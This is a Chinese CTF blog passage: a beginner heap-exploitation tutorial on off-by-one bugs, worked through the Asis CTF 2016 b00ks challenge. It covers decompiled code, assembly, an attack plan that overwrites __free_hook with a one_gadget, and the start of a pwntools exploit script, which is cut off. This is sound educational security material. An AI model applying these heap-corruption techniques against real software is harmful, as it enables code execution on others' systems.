<span class="keyword">void</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(*(<span class="keyword">int</span> *)a1 - *(<span class="keyword">int</span> *)a2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line">    <span class="keyword">char</span> v2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"do you would to sort your girlfriends?[Y/N/@]"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>, &amp;v2);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">89</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>, &amp;v2);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">64</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer two questions!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1+1999=??\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer the question1:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1*1999=??\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please answer the question2:"</span>, &amp;v1);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">94</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are right~\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my girlfriend,today is very interesting!!! "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nice to meet you!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"here is a pole! \n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input your name:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hello my destiny!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">    <span class="keyword">int</span> k; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">    <span class="keyword">int</span> base[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">999</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"how many girlfriends do you have?"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"please input your %dth girlfriends:"</span>, i);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">999</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is the sort result:"</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v2; ++j )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d  "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)base[j]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you can change your girlfriend"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">    v8 = v2;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"which girlfriend do you want to change?"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">        <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v2; ++k )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"now change:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[k]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">79</span> &amp;&amp; v2 &gt; <span class="number">39</span> )</span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> &amp;&amp; v2 &gt; <span class="number">80</span> )</span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">64</span> &amp;&amp; v2 &gt; <span class="number">55</span> )</span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt;= <span class="number">27</span> || v2 &gt; <span class="number">39</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v2 &lt;= <span class="number">26</span> )</span><br><span class="line">                qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                qsort(base,v2,<span class="number">4u</span>LL,cmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//sub();</span></span><br><span class="line">    <span class="comment">//sub2();</span></span><br><span class="line">    sub1();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-heap-learn-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-heap-learn-1/" itemprop="url">pwn/pwn-heap-learn-1</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="pwn堆入门系列教程1"><a href="#pwn堆入门系列教程1" class="headerlink" title="pwn堆入门系列教程1"></a>pwn堆入门系列教程1</h1><p>因为自己学堆的时候，找不到一个系统的教程，我将会按照ctf-wiki的目录一步步学下去，尽量做到每天有更新，方便跟我一样刚入门堆的人学习，第一篇教程研究了4天吧，途中没人指导。。很尴尬，自己一个很容易的点研究了很久才懂，把踩过的坑也总结下，方便后人不再踩坑</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://xz.aliyun.com/t/5749" target="_blank" rel="noopener">具体搭建方法点我</a></p>
<h2 id="off-by-one原理（引用ctf-wiki"><a href="#off-by-one原理（引用ctf-wiki" class="headerlink" title="off by one原理（引用ctf-wiki)"></a>off by one原理（引用ctf-wiki)</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
<p>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。<br>字符串操作不合适<br>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p>
<h2 id="off-by-one-利用思路（引用ctf-wiki"><a href="#off-by-one-利用思路（引用ctf-wiki" class="headerlink" title="off-by-one 利用思路（引用ctf-wiki)"></a>off-by-one 利用思路（引用ctf-wiki)</h2><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法<br>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</p>
<h2 id="off-by-one-自己理解"><a href="#off-by-one-自己理解" class="headerlink" title="off by one 自己理解"></a>off by one 自己理解</h2><p>其实就是程序员不小心，我们自己刚写代码的时候也是那样，经常会搞错，比如如下c代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    str[<span class="number">5</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码相信类似的，我们都写过，我们数组最高是<br>数组总长为5，数组下标从0开始，最大为4，而我们错误地使用了str[5],造成越界写了一个字节，这就是off-by-one，可这个开始我也没懂这个的强大，直到做了一道题目</p>
<h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p>ctf-wiki上用了两种方法解这道题，我也就照着他的exp，一步步调试，没注释就慢慢理解，搞定了，他有纯利用off-by-one的，也有同时利用unlink跟off-by-one的，下面对这两种方法进行解释</p>
<p>先指出ida解析错误部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">    *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">    *(off_202010 + v2) = v3;</span><br><span class="line">    *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">    *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">    *v3 = ++unk_202024;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个v3加6是错误的偏移，应该是v3+3，具体看汇编代码就可以了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">text:<span class="number">0000000000001122</span> ; <span class="number">48</span>:                   *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">.text:<span class="number">0000000000001122</span></span><br><span class="line">.text:<span class="number">0000000000001122</span> loc_1122:                               ; CODE XREF: Create+<span class="number">1B</span>8↑j</span><br><span class="line">.text:<span class="number">0000000000001122</span>                 mov     eax, [rbp+var_20]</span><br><span class="line">.text:<span class="number">0000000000001125</span>                 mov     edx, eax</span><br><span class="line">.text:<span class="number">0000000000001127</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000112B</span>                 mov     [rax+<span class="number">18</span>h], edx</span><br><span class="line">.text:<span class="number">000000000000112</span>E ; <span class="number">49</span>:                   *(off_202010 + v2) = v3;</span><br><span class="line">.text:<span class="number">000000000000112</span>E                 lea     rax, off_202010</span><br><span class="line">.text:<span class="number">0000000000001135</span>                 mov     rax, [rax]</span><br><span class="line">.text:<span class="number">0000000000001138</span>                 mov     edx, [rbp+var_1C]</span><br><span class="line">.text:<span class="number">000000000000113B</span>                 movsxd  rdx, edx</span><br><span class="line">.text:<span class="number">000000000000113</span>E                 shl     rdx, <span class="number">3</span></span><br><span class="line">.text:<span class="number">0000000000001142</span>                 add     rdx, rax</span><br><span class="line">.text:<span class="number">0000000000001145</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001149</span>                 mov     [rdx], rax</span><br><span class="line">.text:<span class="number">000000000000114</span>C ; <span class="number">50</span>:                   *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">.text:<span class="number">000000000000114</span>C                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001150</span>                 mov     rdx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000001154</span>                 mov     [rax+<span class="number">10</span>h], rdx</span><br><span class="line">.text:<span class="number">0000000000001158</span> ; <span class="number">51</span>:                   *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">.text:<span class="number">0000000000001158</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000115</span>C                 mov     rdx, [rbp+ptr]</span><br><span class="line">.text:<span class="number">0000000000001160</span>                 mov     [rax+<span class="number">8</span>], rdx</span><br><span class="line">.text:<span class="number">0000000000001164</span> ; <span class="number">52</span>:                   *v3 = ++unk_202024;</span><br><span class="line">.text:<span class="number">0000000000001164</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">000000000000116B</span>                 mov     eax, [rax]</span><br><span class="line">.text:<span class="number">000000000000116</span>D                 lea     edx, [rax+<span class="number">1</span>]</span><br><span class="line">.text:<span class="number">0000000000001170</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">0000000000001177</span>                 mov     [rax], edx</span><br><span class="line">.text:<span class="number">0000000000001179</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">0000000000001180</span>                 mov     edx, [rax]</span><br><span class="line">.text:<span class="number">0000000000001182</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001186</span>                 mov     [rax], edx</span><br><span class="line">.text:<span class="number">0000000000001188</span>                 mov     eax, <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>看每段的mov语句，</p>
<ul>
<li>第一段是mov [rax+18h],edx对应v3+6?</li>
<li>第二段不看，加了变量</li>
<li>第三段是mov [rax+10h],rdx对应v3+2？</li>
</ul>
<h4 id="off-by-one-攻击过程"><a href="#off-by-one-攻击过程" class="headerlink" title="off-by-one 攻击过程"></a>off-by-one 攻击过程</h4><p>出现这个漏洞的函数在这</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>; <span class="comment">//危险部分</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他由于没考虑好边界条件，多写了一个0到末尾<br>书本结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><p>我先说明下攻击过程，下面的讲解会围绕这个攻击过程来</p>
<ol>
<li>填充满author</li>
<li>创建堆块1，覆盖author结尾的\x00,这样我们输出的时候就可以泄露堆块1的地址</li>
<li>创建堆块2，为后续做准备，堆块2要申请得比较大，因为mmap申请出来的堆块地址与libc有固定的偏移</li>
<li>泄露堆块1地址，记为first_heap</li>
<li><strong>(关键点来了)</strong> 这时候的攻击思路是利用编辑author的时候多写了一个\x00字节，可以覆盖到堆块1的地址的最后一位，如果我们提前将堆块1的内容编辑好，按照上述的结构体布置好，name和description我们自己控制，伪造成一个书本的结构体，然后让覆盖过后的地址刚好是book1的description部分的话，我们相当于获得了一个任意地址读写的能力啊</li>
<li>后面就简单了，任意读取获得libc地址</li>
<li>任意写将__free_hook函数的地址改写成one_gadget地址</li>
</ol>
<p>tips:__free_hook若没有则不调用，若有将先于free函数调用</p>
<h5 id="先贴上exp，没有代码，没有调试就没有灵魂"><a href="#先贴上exp，没有代码，没有调试就没有灵魂" class="headerlink" title="先贴上exp，没有代码，没有调试就没有灵魂"></a>先贴上exp，没有代码，没有调试就没有灵魂</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">'b00ks'</span>)</span><br><span class="line"></span><br><span class="line">LIBC = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">'127.0.0.1'</span></span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> <span class="number">1080</span>)</span><br><span class="line">ctx.binary = <span class="string">'b00ks'</span></span><br><span class="line">ctx.remote_libc = LIBC</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(book_size, book_name, desc_size, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(book_size))</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(book_name) == book_size:<span class="comment">#deal with overflow</span></span><br><span class="line">        io.send(book_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(book_name)</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(desc_size))</span><br><span class="line">    <span class="keyword">if</span> len(desc) == desc_size:</span><br><span class="line">        io.send(desc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span><span class="params">(id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(id):</span><br><span class="line">        book_id = int(io.readline()[:<span class="number">-1</span>])</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_name = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_des = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        